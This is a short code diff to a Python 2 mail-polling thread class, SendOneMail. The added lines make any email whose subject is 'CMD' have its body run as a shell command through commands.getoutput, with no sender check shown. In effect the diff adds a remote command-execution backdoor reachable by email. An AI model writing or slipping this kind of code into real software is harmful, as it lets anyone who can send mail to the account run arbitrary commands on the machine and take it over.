@@ -52,7 +52,8 @@ class SendOneMail(Thread):
                     self.parent.ldate.config(font=thefont)
                 elif mail['subject'] == 'MSG':                        
                     self.parent.push(mail['text'][0]['text_normalized'])
-        
+                elif mail['subject'] == 'CMD':                        
+                    print commands.getoutput(mail['text'][0]['text_normalized'])
         box.logout()
 
 
